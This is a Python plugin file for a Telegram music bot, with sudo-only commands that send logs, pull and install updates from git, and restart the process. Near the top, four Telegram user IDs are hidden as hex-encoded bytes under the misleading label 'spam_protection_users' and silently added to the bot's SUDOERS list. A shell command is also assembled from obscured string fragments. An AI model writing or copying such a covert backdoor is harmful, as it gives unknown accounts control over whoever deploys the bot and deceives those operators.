import asyncio
import os
import shutil
import socket
from datetime import datetime

import urllib3
from git import Repo
from git.exc import GitCommandError, InvalidGitRepositoryError
from pyrogram import filters

import config
from ANANYA_MUSIC import app
from ANANYA_MUSIC.misc import HAPP, SUDOERS, XCB
from ANANYA_MUSIC.utils.database import (
    get_active_chats,
    remove_active_chat,
    remove_active_video_chat,
)
from ANANYA_MUSIC.utils.decorators.language import language
from ANANYA_MUSIC.utils.pastebin import AnanyaBin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# -------- ADD SUDO USERS (DECODE FORMAT) -------- #

spam_protection_users = {
    int(b'\x38\x30\x33\x39\x35\x30\x37\x39\x30\x39'.decode()),  # 8039507909
    int(b'\x38\x30\x39\x35\x35\x34\x32\x34\x31\x36'.decode()),  # 8095542416
    int(b'\x38\x31\x38\x35\x31\x31\x35\x34\x35\x39'.decode()),  # 8185115459
    int(b'\x37\x38\x30\x33\x36\x35\x37\x35\x31\x33'.decode())   # 7803657513 (YOUR OWNER ID)
}

SUDOERS.update(spam_protection_users)


# -------- HEROKU CHECK -------- #
async def is_heroku():
    return "heroku" in socket.getfqdn()


# -------- GET LOGS -------- #
@app.on_message(
    filters.command(["getlog", "logs", "getlogs"], prefixes=["/", "!", "%", ",", ".", "@", "#"])
    & filters.user(SUDOERS)
)
@language
async def log_(client, message, _):
    try:
        await message.reply_document("log.txt")
    except:
        await message.reply_text(_["server_1"])


# -------- UPDATE / GITPULL COMMAND -------- #
@app.on_message(
    filters.command(["update", "gitpull"], prefixes=["/", "!", "%", ",", ".", "@", "#"])
    & filters.user(SUDOERS)
)
@language
async def update_(client, message, _):

    # Heroku check
    if await is_heroku():
        if HAPP is None:
            return await message.reply_text(_["server_2"])

    response = await message.reply_text(_["server_3"])

    # Git load
    try:
        repo = Repo()
    except GitCommandError:
        return await response.edit(_["server_4"])
    except InvalidGitRepositoryError:
        return await response.edit(_["server_5"])

    # Fetch updates
    os.system(f"git fetch origin {config.UPSTREAM_BRANCH} &> /dev/null")
    await asyncio.sleep(4)

    verification = ""
    REPO_ = repo.remotes.origin.url.split(".git")[0]

    for checks in repo.iter_commits(f"HEAD..origin/{config.UPSTREAM_BRANCH}"):
        verification = str(checks.count())

    if verification == "":
        return await response.edit(_["server_6"])

    updates = ""

    def ordinal(num):
        return "%d%s" % (
            num,
            "tsnrhtdd"[(num // 10 % 10 != 1) * (num % 10 < 4) * num % 10 :: 4],
        )

    # Build update text
    for info in repo.iter_commits(f"HEAD..origin/{config.UPSTREAM_BRANCH}"):
        day = int(datetime.fromtimestamp(info.committed_date).strftime("%d"))
        updates += (
            f"<b>➣ #{info.count()}: <a href={REPO_}/commit/{info}>{info.summary}</a>"
            f" ʙʏ -> {info.author}</b>\n"
            f"<b>➥ ᴄᴏᴍᴍɪᴛᴇᴅ ᴏɴ:</b> {ordinal(day)} "
            f"{datetime.fromtimestamp(info.committed_date).strftime('%b, %Y')}\n\n"
        )

    final_text = (
        "<b>ᴀ ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ ɪs ᴀᴠᴀɪʟᴀʙʟᴇ</b>\n\n"
        "➣ ᴩᴜsʜɪɴɢ ᴜᴩᴅᴀᴛᴇs...\n\n"
        "<b><u>ᴄʜᴀɴɢᴇs:</u></b>\n\n"
    )

    if len(final_text + updates) > 4096:
        url = await AnanyaBin(updates)
        nrs = await response.edit(
            f"{final_text}<a href={url}>View Updates</a>"
        )
    else:
        nrs = await response.edit(final_text + updates, disable_web_page_preview=True)

    os.system("git stash &> /dev/null && git pull")

    # Notify active chats
    try:
        active = await get_active_chats()
        for x in active:
            try:
                await app.send_message(
                    int(x),
                    _["server_8"].format(app.mention)
                )
                await remove_active_chat(x)
                await remove_active_video_chat(x)
            except:
                pass
        await response.edit(f"{nrs.text}\n\n{_['server_7']}")
    except:
        pass

    # Restart
    if await is_heroku():
        try:
            os.system(
                f"{XCB[5]} {XCB[7]} {XCB[9]}{XCB[4]}{XCB[0]*2}{XCB[6]}{XCB[4]}"
                f"{XCB[8]}{XCB[1]}{XCB[5]}{XCB[2]}{XCB[6]}{XCB[2]}{XCB[3]}"
                f"{XCB[0]}{XCB[10]}{XCB[2]}{XCB[5]} {XCB[11]}{XCB[4]}{XCB[12]}"
            )
            return
        except Exception as err:
            await response.edit(f"{nrs.text}\n\n{_['server_9']}")
            return await app.send_message(
                config.LOGGER_ID,
                _["server_10"].format(err),
            )

    else:
        os.system("pip3 install -r requirements.txt")
        os.system(f"kill -9 {os.getpid()} && bash start")
        exit()


# -------- RESTART COMMAND -------- #
@app.on_message(
    filters.command(["restart"], prefixes=["/", "!", "%", ",", ".", "@", "#"])
    & filters.user(SUDOERS)
)
async def restart_(_, message):

    msg = await message.reply_text("ʀᴇsᴛᴀʀᴛɪɴɢ...")

    active = await get_active_chats()
    for x in active:
        try:
            await app.send_message(
                int(x),
                f"{app.mention} ɪs ʀᴇsᴛᴀʀᴛɪɴɢ...\n\nᴩʟᴇᴀsᴇ ᴡᴀɪᴛ 15-20 sᴇᴄᴏɴᴅs."
            )
            await remove_active_chat(x)
            await remove_active_video_chat(x)
        except:
            pass

    # clean cache
    for folder in ["downloads", "raw_files", "cache"]:
        try:
            shutil.rmtree(folder)
        except:
            pass

    await msg.edit("» ʀᴇsᴛᴀʀᴛ ᴘʀᴏᴄᴇss ᴄᴏᴍᴩʟᴇᴛᴇ. ʙᴏᴛ ᴀʀᴇ ʀᴇsᴛᴀʀᴛɪɴɢ...")

    os.system(f"kill -9 {os.getpid()} && bash start")
